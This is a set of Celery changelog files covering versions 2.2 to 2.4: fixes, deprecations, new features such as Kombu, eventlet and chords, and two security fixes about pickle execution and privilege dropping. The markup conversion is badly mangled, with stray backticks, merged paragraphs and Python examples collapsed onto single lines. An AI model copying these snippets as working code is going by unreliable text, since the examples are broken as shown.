prefetch count, it's re-enabled as soon as the value is below     the limit again.  *`cursesmon`: Fixed unbound local error (Issue #303).  * eventlet/gevent is now imported on demand so autodoc can import the modules   without having eventlet/gevent installed.  * worker: Ack callback now properly handles`AttributeError`.  *`Task.after\_return`is now always called *after* the result has been   written.  * Cassandra Result Backend: Should now work with the latest`pycassa`version.  * multiprocessing.Pool: No longer cares if the`putlock`semaphore is released   too many times (this can happen if one or more worker processes are   killed).  * SQLAlchemy Result Backend: Now returns accidentally removed`date\_done`again   (Issue #325).  * Task.request context is now always initialized to ensure calling the task   function directly works even if it actively uses the request context.  * Exception occurring when iterating over the result from`TaskSet.apply`fixed.  * eventlet: Now properly schedules tasks with an ETA in the past.  .. _version-2.2.4:  2.2.4 ===== :release-date: 2011-02-19 00:00 AM CET :release-by: Ask Solem  .. _v224-fixes:  Fixes -----  * worker: 2.2.3 broke error logging, resulting in tracebacks not being logged.  * AMQP result backend: Polling task states didn't work properly if there were   more than one result message in the queue.  *`TaskSet.apply\_async()`and`TaskSet.apply()`now supports an optional`taskset\_id`keyword argument (Issue #331).  * The current taskset id (if any) is now available in the task context as`request.taskset``(Issue #329).  * SQLAlchemy result backend: `date_done` was no longer part of the results as it had   been accidentally removed. It's now available again (Issue #325).  * SQLAlchemy result backend: Added unique constraint on `Task.id` and   `TaskSet.taskset_id`. Tables needs to be recreated for this to take effect.  * Fixed exception raised when iterating on the result of``TaskSet.apply()``.  * Tasks user guide: Added section on choosing a result backend.  .. _version-2.2.3:  2.2.3 ===== :release-date: 2011-02-12 04:00 p.m. CET :release-by: Ask Solem  .. _v223-fixes:  Fixes -----  * Now depends on :pypi:`Kombu` 1.0.3  * Task.retry now supports a``max\_retries``argument, used to change the   default value.  * `multiprocessing.cpu_count` may raise `NotImplementedError` on   platforms where this isn't supported (Issue #320).  * Coloring of log messages broke if the logged object wasn't a string.  * Fixed several typos in the init-script documentation.  * A regression caused `Task.exchange` and `Task.routing_key` to no longer   have any effect. This is now fixed.  * Routing user guide: Fixes typo, routers in :setting:`CELERY_ROUTES` must be   instances, not classes.  * :program:`celeryev` didn't create pidfile even though the   :option:`--pidfile <celery events --pidfile>` argument was set.  * Task logger format was no longer used (Issue #317).     The id and name of the task is now part of the log message again.  * A safe version of``repr()`is now used in strategic places to ensure   objects with a broken`\_\_repr\_\_``doesn't crash the worker, or otherwise   make errors hard to understand (Issue #298).  * Remote control command :control:`active_queues`: didn't account for queues added   at runtime.      In addition the dictionary replied by this command now has a different     structure: the exchange key is now a dictionary containing the     exchange declaration in full.  * The :option:`celery worker -Q` option removed unused queue   declarations, so routing of tasks could fail.      Queues are no longer removed, but rather `app.amqp.queues.consume_from()`     is used as the list of queues to consume from.      This ensures all queues are available for routing purposes.  *``celeryctl``: Now supports the `inspect active_queues` command.  .. _version-2.2.2:  2.2.2 ===== :release-date: 2011-02-03 04:00 p.m. CET :release-by: Ask Solem  .. _v222-fixes:  Fixes -----  *``celerybeat``couldn't read the schedule properly, so entries in   :setting:`CELERYBEAT_SCHEDULE` wouldn't be scheduled.  * Task error log message now includes `exc_info` again.  * The `eta` argument can now be used with `task.retry`.      Previously it was overwritten by the countdown argument.  *``celery multi`/`celeryd\_detach``: Now logs errors occurring when executing   the `celery worker` command.  * daemonizing tutorial: Fixed typo``--time-limit 300`->`--time-limit=300`* Colors in logging broke non-string objects in log messages.  *`setup\_task\_logger`no longer makes assumptions about magic task kwargs.  .. _version-2.2.1:  2.2.1 ===== :release-date: 2011-02-02 04:00 p.m. CET :release-by: Ask Solem  .. _v221-fixes:  Fixes -----  * Eventlet pool was leaking memory (Issue #308).  * Deprecated function`celery.execute.delay\_task`was accidentally removed,   now available again.  *`BasePool.on\_terminate`stub didn't exist  *`celeryd\_detach``: Adds readable error messages if user/group name   doesn't exist.  * Smarter handling of unicode decode errors when logging errors.  .. _version-2.2.0:  2.2.0 ===== :release-date: 2011-02-01 10:00 AM CET :release-by: Ask Solem  .. _v220-important:  Important Notes ---------------  * Carrot has been replaced with :pypi:`Kombu`      Kombu is the next generation messaging library for Python,     fixing several flaws present in Carrot that was hard to fix     without breaking backwards compatibility.      Also it adds:      * First-class support for virtual transports; Redis, Django ORM,       SQLAlchemy, Beanstalk, MongoDB, CouchDB and in-memory.     * Consistent error handling with introspection,     * The ability to ensure that an operation is performed by gracefully       handling connection and channel errors,     * Message compression (:mod:`zlib`, :mod:`bz2`, or custom compression schemes).      This means that `ghettoq` is no longer needed as the     functionality it provided is already available in Celery by default.     The virtual transports are also more feature complete with support     for exchanges (direct and topic). The Redis transport even supports     fanout exchanges so it's able to perform worker remote control     commands.  * Magic keyword arguments pending deprecation.      The magic keyword arguments were responsible for many problems     and quirks: notably issues with tasks and decorators, and name     collisions in keyword arguments for the unaware.      It wasn't easy to find a way to deprecate the magic keyword arguments,     but we think this is a solution that makes sense and it won't     have any adverse effects for existing code.      The path to a magic keyword argument free world is:          * the `celery.decorators` module is deprecated and the decorators           can now be found in `celery.task`.         * The decorators in `celery.task` disables keyword arguments by           default         * All examples in the documentation have been changed to use           `celery.task`.          This means that the following will have magic keyword arguments         enabled (old style):``\`python from celery.decorators import task

</div>

> @task() def add(x, y, \*\*kwargs): print('In task %s' % kwargs\['task\_id'\]) return x + y
> 
> And this won't use magic keyword arguments (new style):
> 
> ``` python
> ```
> 
> from celery.task import task
> 
> @task() def add(x, y): print('In task %s' % add.request.id) return x + y
> 
> In addition, tasks can choose not to accept magic keyword arguments by setting the <span class="title-ref">task.accept\_magic\_kwargs</span> attribute.
> 
> <div class="admonition">
> 
> Deprecation
> 
> </div>
> 
> Using the decorators in `celery.decorators` emits a <span class="title-ref">PendingDeprecationWarning</span> with a helpful message urging you to change your code, in version 2.4 this will be replaced with a <span class="title-ref">DeprecationWarning</span>, and in version 4.0 the `celery.decorators` module will be removed and no longer exist.
> 
> Similarly, the <span class="title-ref">task.accept\_magic\_kwargs</span> attribute will no longer have any effect starting from version 4.0.

  - The magic keyword arguments are now available as <span class="title-ref">task.request</span>
    
    > This is called *the context*. Using thread-local storage the context contains state that's related to the current request.
    > 
    > It's mutable and you can add custom attributes that'll only be seen by the current task request.
    > 
    > The following context attributes are always available:
    > 
    > | **Magic Keyword Argument**                                 | **Replace with**                                           |
    > | ---------------------------------------------------------- | ---------------------------------------------------------- |
    > | <span class="title-ref">kwargs\['task\_id'\]</span>        | <span class="title-ref">self.request.id</span>             |
    > | <span class="title-ref">kwargs\['delivery\_info'\]</span>  | <span class="title-ref">self.request.delivery\_info</span> |
    > | <span class="title-ref">kwargs\['task\_retries'\]</span>   | <span class="title-ref">self.request.retries</span>        |
    > | <span class="title-ref">kwargs\['logfile'\]</span>         | <span class="title-ref">self.request.logfile</span>        |
    > | <span class="title-ref">kwargs\['loglevel'\]</span>        | <span class="title-ref">self.request.loglevel</span>       |
    > | <span class="title-ref">kwargs\['task\_is\_eager'\]</span> | <span class="title-ref">self.request.is\_eager</span>      |
    > | **NEW**                                                    | <span class="title-ref">self.request.args</span>           |
    > | **NEW**                                                    | <span class="title-ref">self.request.kwargs</span>         |
    > 

    > In addition, the following methods now automatically uses the current context, so you don't have to pass <span class="title-ref">kwargs</span> manually anymore:
    > 
    > >   - <span class="title-ref">task.retry</span>
    > >   - <span class="title-ref">task.get\_logger</span>
    > >   - <span class="title-ref">task.update\_state</span>

  - [Eventlet](http://eventlet.net) support.
    
    > This is great news for I/O-bound tasks\!
    > 
    > To change pool implementations you use the `celery worker --pool` argument, or globally using the `CELERYD_POOL` setting. This can be the full name of a class, or one of the following aliases: <span class="title-ref">processes</span>, <span class="title-ref">eventlet</span>, <span class="title-ref">gevent</span>.
    > 
    > For more information please see the \[concurrency-eventlet\](\#concurrency-eventlet) section in the User Guide.
    > 
    > <div class="admonition">
    > 
    > Why not gevent?
    > 
    > For our first alternative concurrency implementation we've focused on [Eventlet](http://eventlet.net), but there's also an experimental [gevent]() pool available. This is missing some features, notably the ability to schedule ETA tasks.
    > 
    > Hopefully the [gevent]() support will be feature complete by version 2.3, but this depends on user demand (and contributions).
    > 
    > </div>

<!-- end list -->

  - `` ` .. _`gevent`: http://gevent.org  * Python 2.4 support deprecated!      We're happy^H^H^H^H^Hsad to announce that this is the last version     to support Python 2.4.      You're urged to make some noise if you're currently stuck with     Python 2.4. Complain to your package maintainers, sysadmins and bosses:     tell them it's time to move on!      Apart from wanting to take advantage of :keyword:`with` statements,     coroutines, conditional expressions and enhanced :keyword:`try` blocks,     the code base now contains so many 2.4 related hacks and workarounds     it's no longer just a compromise, but a sacrifice.      If it really isn't your choice, and you don't have the option to upgrade     to a newer version of Python, you can just continue to use Celery 2.2.     Important fixes can be back ported for as long as there's interest.  * worker: Now supports Autoscaling of child worker processes.      The :option:`--autoscale <celery worker --autoscale>` option can be used     to configure the minimum and maximum number of child worker processes: ``\`text
    
      - \--autoscale=AUTOSCALE  
        Enable autoscaling by providing max\_concurrency,min\_concurrency. Example: --autoscale=10,3 (always keep 3 processes, but grow to 10 if necessary).

<!-- end list -->

  - Remote Debugging of Tasks
    
    > `celery.contrib.rdb` is an extended version of `pdb` that enables remote debugging of processes that doesn't have terminal access.
    > 
    > Example usage:
    > 
    > ``` text
    > from celery.contrib import rdb
    > from celery.task import task
    > 
    > @task()
    > def add(x, y):
    >     result = x + y
    >     # set breakpoint
    >     rdb.set_trace()
    >     return result
    > 
    > `~celery.contrib.rdb.set_trace` sets a breakpoint at the current
    > location and creates a socket you can telnet into to remotely debug
    > your task.
    > 
    > The debugger may be started by multiple processes at the same time,
    > so rather than using a fixed port the debugger will search for an
    > available port, starting from the base port (6900 by default).
    > The base port can be changed using the environment variable
    > :envvar:`CELERY_RDB_PORT`.
    > 
    > By default the debugger will only be available from the local host,
    > to enable access from the outside you have to set the environment
    > variable :envvar:`CELERY_RDB_HOST`.
    > 
    > When the worker encounters your breakpoint it will log the following
    > information::
    > 
    > [INFO/MainProcess] Received task:
    >     tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8]
    > [WARNING/PoolWorker-1] Remote Debugger:6900:
    >     Please telnet 127.0.0.1 6900.  Type `exit` in session to continue.
    > [2011-01-18 14:25:44,119: WARNING/PoolWorker-1] Remote Debugger:6900:
    >     Waiting for client...
    > 
    > If you telnet the port specified you'll be presented
    > with a ``pdb`` shell:
    > 
    > .. code-block:: console
    > 
    > $ telnet localhost 6900
    > Connected to localhost.
    > Escape character is '^]'.
    > > /opt/devel/demoapp/tasks.py(128)add()
    > -> return result
    > (Pdb)
    > 
    > Enter ``help`` to get a list of available commands,
    > It may be a good idea to read the `Python Debugger Manual`_ if
    > you have never used `pdb` before.
    > ```

\* Events are now transient and is using a topic exchange (instead of direct).

> The <span class="title-ref">CELERYD\_EVENT\_EXCHANGE</span>, <span class="title-ref">CELERYD\_EVENT\_ROUTING\_KEY</span>, <span class="title-ref">CELERYD\_EVENT\_EXCHANGE\_TYPE</span> settings are no longer in use.
> 
> This means events won't be stored until there's a consumer, and the events will be gone as soon as the consumer stops. Also it means there can be multiple monitors running at the same time.
> 
> The routing key of an event is the type of event (e.g., <span class="title-ref">worker.started</span>, <span class="title-ref">worker.heartbeat</span>, <span class="title-ref">task.succeeded</span>, etc. This means a consumer can filter on specific types, to only be alerted of the events it cares about.
> 
> Each consumer will create a unique queue, meaning it's in effect a broadcast exchange.
> 
> This opens up a lot of possibilities, for example the workers could listen for worker events to know what workers are in the neighborhood, and even restart workers when they go down (or use this information to optimize tasks/autoscaling).
> 
> \> **Note**

  - \>  
    The event exchange has been renamed from `"celeryevent"` to `"celeryev"` so it doesn't collide with older versions.
    
    If you'd like to remove the old exchange you can do so by executing the following command:
    
    ``` console
    $ camqadm exchange.delete celeryevent
    ```

  - \* The worker now starts without configuration, and configuration can be  
    specified directly on the command-line.
    
    Configuration options must appear after the last argument, separated by two dashes:
    
    ``` console
    $ celery worker -l info -I tasks -- broker.host=localhost broker.vhost=/app
    ```

  - \* Configuration is now an alias to the original configuration, so changes  
    to the original will reflect Celery at runtime.

  - \* <span class="title-ref">celery.conf</span> has been deprecated, and modifying <span class="title-ref">celery.conf.ALWAYS\_EAGER</span>  
    will no longer have any effect.
    
    > The default configuration is now available in the `celery.app.defaults` module. The available configuration options and their types can now be introspected.

  - \* Remote control commands are now provided by <span class="title-ref">kombu.pidbox</span>, the generic  
    process mailbox.

  - \* Internal module <span class="title-ref">celery.worker.listener</span> has been renamed to  
    <span class="title-ref">celery.worker.consumer</span>, and <span class="title-ref">.CarrotListener</span> is now <span class="title-ref">.Consumer</span>.

  - \* Previously deprecated modules <span class="title-ref">celery.models</span> and  
    <span class="title-ref">celery.management.commands</span> have now been removed as per the deprecation time-line.

  - \* \[Security: Low severity\] Removed <span class="title-ref">celery.task.RemoteExecuteTask</span> and  
    accompanying functions: <span class="title-ref">dmap</span>, <span class="title-ref">dmap\_async</span>, and <span class="title-ref">execute\_remote</span>.
    
    Executing arbitrary code using pickle is a potential security issue if someone gains unrestricted access to the message broker.
    
    If you really need this functionality, then you'd've to add this to your own project.

  - \* \[Security: Low severity\] The <span class="title-ref">stats</span> command no longer transmits the  
    broker password.
    
    > One would've needed an authenticated broker connection to receive this password in the first place, but sniffing the password at the wire level would've been possible if using unencrypted communication.

<div id="v220-news">

News `` ` ----  * The internal module `celery.task.builtins` has been removed.  * The module `celery.task.schedules` is deprecated, and   `celery.schedules` should be used instead.      For example if you have::          from celery.task.schedules import crontab      You should replace that with::          from celery.schedules import crontab      The module needs to be renamed because it must be possible     to import schedules without importing the `celery.task` module.  * The following functions have been deprecated and is scheduled for   removal in version 2.3:      * `celery.execute.apply_async`          Use `task.apply_async()` instead.      * `celery.execute.apply`          Use `task.apply()` instead.      * `celery.execute.delay_task`          Use `registry.tasks[name].delay()` instead.  * Importing `TaskSet` from `celery.task.base` is now deprecated.      You should use::          >>> from celery.task import TaskSet      instead.  * New remote control commands:      * `active_queues`          Returns the queue declarations a worker is currently consuming from.  * Added the ability to retry publishing the task message in   the event of connection loss or failure.      This is disabled by default but can be enabled using the     :setting:`CELERY_TASK_PUBLISH_RETRY` setting, and tweaked by     the :setting:`CELERY_TASK_PUBLISH_RETRY_POLICY` setting.      In addition `retry`, and `retry_policy` keyword arguments have     been added to `Task.apply_async`.      > **Note** >          Using the `retry` argument to `apply_async` requires you to         handle the publisher/connection manually.  * Periodic Task classes (`@periodic_task`/`PeriodicTask`) will *not* be   deprecated as previously indicated in the source code.      But you're encouraged to use the more flexible     :setting:`CELERYBEAT_SCHEDULE` setting.  * Built-in daemonization support of the worker using `celery multi`   is no longer experimental and is considered production quality.       See [daemon-generic](#daemon-generic) if you want to use the new generic init      scripts.  * Added support for message compression using the   :setting:`CELERY_MESSAGE_COMPRESSION` setting, or the `compression` argument   to `apply_async`. This can also be set using routers.  * worker: Now logs stack-trace of all threads when receiving the    `SIGUSR1` signal (doesn't work on CPython 2.4, Windows or Jython).      Inspired by https://gist.github.com/737056  * Can now remotely terminate/kill the worker process currently processing   a task.      The `revoke` remote control command now supports a `terminate` argument     Default signal is `TERM`, but can be specified using the `signal`     argument. Signal can be the uppercase name of any signal defined     in the :mod:`signal` module in the Python Standard Library.      Terminating a task also revokes it.      Example::          >>> from celery.task.control import revoke          >>> revoke(task_id, terminate=True)         >>> revoke(task_id, terminate=True, signal='KILL')         >>> revoke(task_id, terminate=True, signal='SIGKILL')  * `TaskSetResult.join_native`: Backend-optimized version of `join()`.      If available, this version uses the backends ability to retrieve     multiple results at once, unlike `join()` which fetches the results     one by one.      So far only supported by the AMQP result backend. Support for Memcached     and Redis may be added later.  * Improved implementations of `TaskSetResult.join` and `AsyncResult.wait`.     An `interval` keyword argument have been added to both so the    polling interval can be specified (default interval is 0.5 seconds).      A `propagate` keyword argument have been added to `result.wait()`,     errors will be returned instead of raised if this is set to False.      > **Warning** >          You should decrease the polling interval when using the database         result backend, as frequent polling can result in high database load.   * The PID of the child worker process accepting a task is now sent as a field   with the :event:`task-started` event.  * The following fields have been added to all events in the worker class:      * `sw_ident`: Name of worker software (e.g., ``"py-celery"``).     * `sw_ver`: Software version (e.g., 2.2.0).     * `sw_sys`: Operating System (e.g., Linux, Windows, Darwin).  * For better accuracy the start time reported by the multiprocessing worker   process is used when calculating task duration.      Previously the time reported by the accept callback was used.  * `celerybeat`: New built-in daemonization support using the `--detach`    option.  * `celeryev`: New built-in daemonization support using the `--detach`    option.  * `TaskSet.apply_async`: Now supports custom publishers by using the   `publisher` argument.  * Added :setting:`CELERY_SEND_TASK_SENT_EVENT` setting.      If enabled an event will be sent with every task, so monitors can     track tasks before the workers receive them.  * `celerybeat`: Now reuses the broker connection when calling    scheduled tasks.  * The configuration module and loader to use can now be specified on   the command-line.      For example:``\`console $ celery worker --config=celeryconfig.py --loader=myloader.Loader

</div>

  - Added signals: <span class="title-ref">beat\_init</span> and <span class="title-ref">beat\_embedded\_init</span>
    
    >   - `celery.signals.beat_init`
    >     
    >     > Dispatched when `celerybeat` starts (either standalone or embedded). Sender is the <span class="title-ref">celery.beat.Service</span> instance.
    > 
    >   - `celery.signals.beat_embedded_init`
    >     
    >     > Dispatched in addition to the `beat_init` signal when `celerybeat` is started as an embedded process. Sender is the <span class="title-ref">celery.beat.Service</span> instance.

  - Redis result backend: Removed deprecated settings <span class="title-ref">REDIS\_TIMEOUT</span> and <span class="title-ref">REDIS\_CONNECT\_RETRY</span>.

  - CentOS init-script for `celery worker` now available in <span class="title-ref">extra/centos</span>.

  - Now depends on `pyparsing` version 1.5.0 or higher.
    
    > There have been reported issues using Celery with `pyparsing` 1.4.x, so please upgrade to the latest version.

  - Lots of new unit tests written, now with a total coverage of 95%.

<div id="v220-fixes">

Fixes `` ` -----  * `celeryev` Curses Monitor: Improved resize handling and UI layout   (Issue #274 + Issue #276)  * AMQP Backend: Exceptions occurring while sending task results are now   propagated instead of silenced.      the worker will then show the full traceback of these errors in the log.  * AMQP Backend: No longer deletes the result queue after successful   poll, as this should be handled by the   :setting:`CELERY_AMQP_TASK_RESULT_EXPIRES` setting instead.  * AMQP Backend: Now ensures queues are declared before polling results.  * Windows: worker: Show error if running with `-B` option.      Running ``celerybeat`embedded is known not to work on Windows, so     users are encouraged to run`celerybeat`as a separate service instead.  * Windows: Utilities no longer output ANSI color codes on Windows  *`camqadm``: Now properly handles :kbd:`Control-c` by simply exiting instead   of showing confusing traceback.  * Windows: All tests are now passing on Windows.  * Remove bin/ directory, and `scripts` section from :file:`setup.py`.      This means we now rely completely on setuptools entry-points.  .. _v220-experimental:  Experimental ------------  * Jython: worker now runs on Jython using the threaded pool.      All tests pass, but there may still be bugs lurking around the corners.  * PyPy: worker now runs on PyPy.      It runs without any pool, so to get parallel execution you must start     multiple instances (e.g., using :program:`multi`).      Sadly an initial benchmark seems to show a 30% performance decrease on``pypy-1.4.1``+ JIT. We would like to find out why this is, so stay tuned.  * `PublisherPool`: Experimental pool of task publishers and   connections to be used with the `retry` argument to `apply_async`.    The example code below will re-use connections and channels, and   retry sending of the task message if the connection is lost.``\`python from celery import current\_app

</div>

\# Global pool pool = current\_app().amqp.PublisherPool(limit=10)

  - def my\_view(request):
    
      - with pool.acquire() as publisher:  
        add.apply\_async((2, 2), publisher=publisher, retry=True)

\`\`\`

---

changelog-2.3.md

---

# Change history for Celery 2.3

<div class="contents" data-local="">

</div>

## 2.3.4

  - release-date  
    2011-11-25 04:00 p.m. GMT

  - release-by  
    Ask Solem

### Security Fixes

  - \[Security: [CELERYSA-0001](https://github.com/celery/celery/tree/master/docs/sec/CELERYSA-0001.txt)\] Daemons would set effective id's rather than real id's when the `!--uid`/ `!--gid` arguments to `celery multi`, `celeryd_detach`, `celery beat` and `celery events` were used.
    
    This means privileges weren't properly dropped, and that it would be possible to regain supervisor privileges later.

### Fixes

  - Backported fix for \#455 from 2.4 to 2.3.
  - StateDB wasn't saved at shutdown.
  - Fixes worker sometimes hanging when hard time limit exceeded.

## 2.3.3

  - release-date  
    2011-16-09 05:00 p.m. BST

  - release-by  
    Mher Movsisyan

<!-- end list -->

  - Monkey patching <span class="title-ref">sys.stdout</span> could result in the worker crashing if the replacing object didn't define <span class="title-ref">isatty</span> (Issue \#477).
  - `CELERYD` option in `/etc/default/celeryd` shouldn't be used with generic init-scripts.

## 2.3.2

  - release-date  
    2011-10-07 05:00 p.m. BST

  - release-by  
    Ask Solem

### News

  - Improved Contributing guide.
    
    > If you'd like to contribute to Celery you should read the \[Contributing Gudie \<contributing\>\](\#contributing-gudie-\<contributing\>).
    > 
    > We're looking for contributors at all skill levels, so don't hesitate\!

  - Now depends on Kombu 1.3.1

  - `Task.request` now contains the current worker host name (Issue \#460).
    
    > Available as `task.request.hostname`.

  -   - It's now easier for app subclasses to extend how they're pickled.  
        (see <span class="title-ref">celery.app.AppPickler</span>).

### Fixes

  - <span class="title-ref">purge/discard\_all</span> wasn't working correctly (Issue \#455).

  - The coloring of log messages didn't handle non-ASCII data well (Issue \#427).

  - \[Windows\] the multiprocessing pool tried to import `os.kill` even though this isn't available there (Issue \#450).

  - Fixes case where the worker could become unresponsive because of tasks exceeding the hard time limit.

  - The `task-sent` event was missing from the event reference.

  - `ResultSet.iterate` now returns results as they finish (Issue \#459).
    
    > This wasn't the case previously, even though the documentation states this was the expected behavior.

  - Retries will no longer be performed when tasks are called directly (using `__call__`).
    
    > Instead the exception passed to `retry` will be re-raised.

  - Eventlet no longer crashes if autoscale is enabled.
    
    > growing and shrinking eventlet pools is still not supported.

  - `py24` target removed from `tox.ini`.

## 2.3.1

  - release-date  
    2011-08-07 08:00 p.m. BST

  - release-by  
    Ask Solem

### Fixes

  - The `CELERY_AMQP_TASK_RESULT_EXPIRES` setting didn't work, resulting in an AMQP related error about not being able to serialize floats while trying to publish task states (Issue \#446).

## 2.3.0

  - release-date  
    2011-08-05 12:00 p.m. BST

  - tested  
    CPython: 2.5, 2.6, 2.7; PyPy: 1.5; Jython: 2.5.2

  - release-by  
    Ask Solem

### Important Notes

  - Now requires Kombu 1.2.1

\* Results are now disabled by default.

> The AMQP backend wasn't a good default because often the users were not consuming the results, resulting in thousands of queues.
> 
> While the queues can be configured to expire if left unused, it wasn't possible to enable this by default because this was only available in recent RabbitMQ versions (2.1.1+)
> 
> With this change enabling a result backend will be a conscious choice, which will hopefully lead the user to read the documentation and be aware of any common pitfalls with the particular backend.
> 
> The default backend is now a dummy backend (<span class="title-ref">celery.backends.base.DisabledBackend</span>). Saving state is simply an no-op, and AsyncResult.wait(), .result, .state, etc. will raise a <span class="title-ref">NotImplementedError</span> telling the user to configure the result backend.
> 
> For help choosing a backend please see \[task-result-backends\](\#task-result-backends).
> 
> If you depend on the previous default which was the AMQP backend, then you have to set this explicitly before upgrading:
> 
>     CELERY_RESULT_BACKEND = 'amqp'
> 
> \> **Note**

  - \>  
    For `django-celery` users the default backend is still `database`, and results are not disabled by default.

  - \* The Debian init-scripts have been deprecated in favor of the generic-init.d  
    init-scripts.
    
    > In addition generic init-scripts for `celerybeat` and `celeryev` has been added.

### News

  - Automatic connection pool support.
    
    > The pool is used by everything that requires a broker connection, for example calling tasks, sending broadcast commands, retrieving results with the AMQP result backend, and so on.
    > 
    > The pool is disabled by default, but you can enable it by configuring the `BROKER_POOL_LIMIT` setting:
    > 
    >     BROKER_POOL_LIMIT = 10
    > 
    > A limit of 10 means a maximum of 10 simultaneous connections can co-exist. Only a single connection will ever be used in a single-thread environment, but in a concurrent environment (threads, greenlets, etc., but not processes) when the limit has been exceeded, any try to acquire a connection will block the thread and wait for a connection to be released. This is something to take into consideration when choosing a limit.
    > 
    > A limit of <span class="title-ref">None</span> or 0 means no limit, and connections will be established and closed every time.

  - Introducing Chords (taskset callbacks).
    
    > A chord is a task that only executes after all of the tasks in a taskset has finished executing. It's a fancy term for "taskset callbacks" adopted from [Cω](http://research.microsoft.com/en-us/um/cambridge/projects/comega/)).
    > 
    > It works with all result backends, but the best implementation is currently provided by the Redis result backend.
    > 
    > Here's an example chord:
    > 
    >     >>> chord(add.subtask((i, i))
    >     ...         for i in xrange(100))(tsum.subtask()).get()
    >     9900
    > 
    > Please read the \[Chords section in the user guide \<canvas-chord\>\](\#chords-section-in-the-user-guide-\<canvas-chord\>), if you want to know more.

\* Time limits can now be set for individual tasks.

> To set the soft and hard time limits for a task use the `time_limit` and `soft_time_limit` attributes:
> 
>   - \`\`\`python  
>     import time
>     
>     @task(time\_limit=60, soft\_time\_limit=30) def sleeptask(seconds): time.sleep(seconds)
> 
> If the attributes are not set, then the workers default time limits will be used.
> 
> New in this version you can also change the time limits for a task at runtime using the <span class="title-ref">time\_limit</span> remote control command:
> 
>     >>> from celery.task import control
>     >>> control.time_limit('tasks.sleeptask',
>     ...                    soft=60, hard=120, reply=True)
>     [{'worker1.example.com': {'ok': 'time limits set successfully'}}]
> 
> Only tasks that starts executing after the time limit change will be affected.
> 
> \> **Note**

  - \>  
    Soft time limits will still not work on Windows or other platforms that don't have the `SIGUSR1` signal.

  - \* Redis backend configuration directive names changed to include the  
    `CELERY_` prefix.
    
    > 
    > 
    > | **Old setting name**                           | **Replace with**                                       |
    > | ---------------------------------------------- | ------------------------------------------------------ |
    > | <span class="title-ref">REDIS\_HOST</span>     | <span class="title-ref">CELERY\_REDIS\_HOST</span>     |
    > | <span class="title-ref">REDIS\_PORT</span>     | <span class="title-ref">CELERY\_REDIS\_PORT</span>     |
    > | <span class="title-ref">REDIS\_DB</span>       | <span class="title-ref">CELERY\_REDIS\_DB</span>       |
    > | <span class="title-ref">REDIS\_PASSWORD</span> | <span class="title-ref">CELERY\_REDIS\_PASSWORD</span> |
    > 

    > The old names are still supported but pending deprecation.

  - \* PyPy: The default pool implementation used is now multiprocessing  
    if running on PyPy 1.5.

<!-- end list -->

  - multi: now supports "pass through" options.
    
    > Pass through options makes it easier to use Celery without a configuration file, or just add last-minute options on the command line.
    > 
    > Example use:
    > 
    > ``` console
    > $ celery multi start 4  -c 2  -- broker.host=amqp.example.com \
    >                                  broker.vhost=/               \
    >                                  celery.disable_rate_limits=yes
    > ```

  - `celerybeat`: Now retries establishing the connection (Issue \#419).

  - `celeryctl`: New `list bindings` command.
    
    > Lists the current or all available bindings, depending on the broker transport used.

  - Heartbeat is now sent every 30 seconds (previously every 2 minutes).

  - `ResultSet.join_native()` and `iter_native()` is now supported by the Redis and Cache result backends.
    
    > This is an optimized version of `join()` using the underlying backends ability to fetch multiple results at once.

  - Can now use SSL when sending error e-mails by enabling the `EMAIL_USE_SSL` setting.

  - `events.default_dispatcher()`: Context manager to easily obtain an event dispatcher instance using the connection pool.

  - Import errors in the configuration module won't be silenced anymore.

  - ResultSet.iterate: Now supports the `timeout`, `propagate` and `interval` arguments.

  - `with_default_connection` -\> `with default_connection`

  - TaskPool.apply\_async: Keyword arguments `callbacks` and `errbacks` has been renamed to `callback` and `errback` and take a single scalar value instead of a list.

  - No longer propagates errors occurring during process cleanup (Issue \#365)

  - Added `TaskSetResult.delete()`, which will delete a previously saved taskset result.

  - `celerybeat` now syncs every 3 minutes instead of only at shutdown (Issue \#382).

  - Monitors now properly handles unknown events, so user-defined events are displayed.

  - Terminating a task on Windows now also terminates all of the tasks child processes (Issue \#384).

  - worker: `-I|--include` option now always searches the current directory to import the specified modules.

  - Cassandra backend: Now expires results by using TTLs.

  - Functional test suite in `funtests` is now actually working properly, and passing tests.

<div id="v230-fixes">

Fixes `` ` -----  * ``celeryev`was trying to create the pidfile twice.  * celery.contrib.batches: Fixed problem where tasks failed   silently (Issue #393).  * Fixed an issue where logging objects would give "<Unrepresentable",   even though the objects were.  *`CELERY\_TASK\_ERROR\_WHITE\_LIST`is now properly initialized   in all loaders.  *`celeryd\_detach`now passes through command line configuration.  * Remote control command`add\_consumer\`\` now does nothing if the queue is already being consumed from.

</div>

---

changelog-2.4.md

---

# Change history for Celery 2.4

<div class="contents" data-local="">

</div>

## 2.4.5

  - release-date  
    2011-12-02 05:00 p.m. GMT

  - release-by  
    Ask Solem

<!-- end list -->

  - Periodic task interval schedules were accidentally rounded down, resulting in some periodic tasks being executed early.

  - Logging of humanized times in the beat log is now more detailed.

  - New \[brokers\](\#brokers) section in the Getting Started part of the Documentation
    
    > This replaces the old "Other queues" tutorial, and adds documentation for MongoDB, Beanstalk and CouchDB.

## 2.4.4

  - release-date  
    2011-11-25 04:00 p.m. GMT

  - release-by  
    Ask Solem

### Security Fixes

  - \[Security: [CELERYSA-0001](https://github.com/celery/celery/tree/master/docs/sec/CELERYSA-0001.txt)\] Daemons would set effective id's rather than real id's when the `!--uid`/ `!--gid` arguments to `celery multi`, `celeryd_detach`, `celery beat` and `celery events` were used.
    
    This means privileges weren't properly dropped, and that it would be possible to regain supervisor privileges later.

### Fixes

  - Processes pool: Fixed rare deadlock at shutdown (Issue \#523).
    
    > Fix contributed by Ionel Maries Christian.

  - Webhook tasks issued the wrong HTTP POST headers (Issue \#515).
    
    > The *Content-Type* header has been changed from `application/json` ⇒ `application/x-www-form-urlencoded`, and adds a proper *Content-Length* header.
    > 
    > Fix contributed by Mitar.

  - Daemonization tutorial: Adds a configuration example using Django and virtualenv together (Issue \#505).
    
    > Contributed by Juan Ignacio Catalano.

  - generic init-scripts now automatically creates log and pid file directories (Issue \#545).
    
    > Contributed by Chris Streeter.

## 2.4.3

  - release-date  
    2011-11-22 06:00 p.m. GMT

  - release-by  
    Ask Solem

<!-- end list -->

  - Fixes module import typo in <span class="title-ref">celeryctl</span> (Issue \#538).
    
    > Fix contributed by Chris Streeter.

## 2.4.2

  - release-date  
    2011-11-14 12:00 p.m. GMT

  - release-by  
    Ask Solem

<!-- end list -->

  - Program module no longer uses relative imports so that it's possible to do `python -m celery.bin.name`.

## 2.4.1

  - release-date  
    2011-11-07 06:00 p.m. GMT

  - release-by  
